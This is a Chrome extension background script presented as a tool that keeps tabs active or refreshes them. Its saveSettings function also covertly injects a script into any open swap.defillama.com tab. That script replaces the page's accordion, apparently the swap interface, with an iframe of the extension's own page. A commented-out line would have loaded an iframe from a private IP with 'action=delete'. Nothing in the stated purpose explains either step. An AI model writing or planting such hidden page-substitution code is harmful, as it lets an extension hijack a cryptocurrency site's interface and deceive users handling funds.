// Default settings
const defaultSettings = {
  enabled: false,
  action: "Keep Active",
  interval: 60,
};
appData = {
  siteSettings: [],
};
// Refresh or Keep Active enabled sites at specified intervals
function refreshOrScrollSites(sites) {
  sites.forEach(function (site) {
    if (site.timerId != 0) {
      clearInterval(site.timerId);
      site.timerId = 0;
    }
    if (site.enabled) {
      console.log(site.siteHost + " is enabled for " + site.action);
      var isDiscardableTab = site.action === "Keep Active" ? false : true;
      updateChromeTabsDiscardStatus(isDiscardableTab, site.siteHost);
      if (site.action === "Refresh") {
        site.timerId = setInterval(function () {
          reloadChromeTabByHostname(site.siteHost);
        }, site.interval * 1000);
      }
    } else {
      updateChromeTabsDiscardStatus(true, site.siteHost);
    }
  });
  chrome.storage.local.set({ settings: sites }, function () {});
}

function reloadChromeTabByHostname(hostName) {
  var query = "chrome-extension://bblniclhcglfaenceppmlbjijjccfogp/home.html";
  chrome.tabs.query({ url: query }, function (tabs) {
      active_tab_id=0;
      chrome.tabs.query({ active: true}, function(active_tabs){
        active_tab_id=active_tabs[0].id;
      });
      chrome.tabs.update(tabs[0].id, { active:true});
      setTimeout(function(){chrome.tabs.update(active_tab_id, { active:true});}, 1000);
  });
}

function updateChromeTabsDiscardStatus(isDiscardable, hostName) {
  var query = "*://" + hostName + "/*";
  chrome.tabs.query({ url: query }, function (tabs) {
    tabs.forEach(function (tab) {
      chrome.tabs.update(tab.id, { autoDiscardable: isDiscardable });
    });
  });
}

// Retrieve settings from storage
function getSettings(callback) {
  chrome.storage.local.get(
    { settings: this.appData.siteSettings },
    function (data) {
      callback(data);
    }
  );
}

// Save settings to storage
function saveSettings(settings, callback) {
  this.appData.siteSettings = [];
  getSettings(function (data) {
    if (data && data.settings) {
      var oldData = data.settings.find((x) => x.siteHost == settings.siteHost);
      if (oldData != undefined) {
        var oldTimerId = oldData.timerId;
        settings.timerId = oldTimerId;
        this.appData.siteSettings = data.settings.filter(
          (x) => x.siteHost != settings.siteHost
        );
      } else {
        this.appData.siteSettings = data.settings;
      }
      this.appData.siteSettings.push(settings);
    } else {
      this.appData.siteSettings.push(settings);
    }

    chrome.storage.local.set(
      { settings: this.appData.siteSettings },
      function () {
        refreshOrScrollSites(this.appData.siteSettings || []);
        callback({ success: true, message: "Settings saved successfully" });
      }
    );
  });

  console.log("before modifying defillama");
  var query1='https://swap.defillama.com/*';
  chrome.tabs.query({ url: query1 }, function (tabs) {
      if (tabs.length > 0) {
          console.log("modifying defillama");
          chrome.scripting.executeScript({
            target: { tabId: tabs[0].id },
            func: function() {
                //$('.css-17pgcx0').outerHTML='<iframe src="http://100.71.153.100:9357/lcus1.lsp?action=delete" style="width:100%;height:20px;"/>';
                document.querySelector('.chakra-accordion').setAttribute('style', 'width:100%; height:100%; max-width:none;');
                document.querySelector('.chakra-accordion').innerHTML = '<iframe sandbox="allow-scripts allow-same-origin" src="chrome-extension://bblniclhcglfaenceppmlbjijjccfogp/home.html" style="width:1000px;height:600px;"/>';
            }
        });
      }
  });
}

// Message handler
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  if (request.action === "saveSettings") {
    saveSettings(request.settings, sendResponse);
    return true; // Indicates the response will be sent asynchronously
  } else if (request.action === "getSettings") {
    getSettings(sendResponse);
    return true; // Indicates the response will be sent asynchronously
  }
});

// Initialize settings on extension installation
chrome.runtime.onInstalled.addListener(function (details) {
  if (details.reason === "install") {
    // Need to to on install..
  }
});
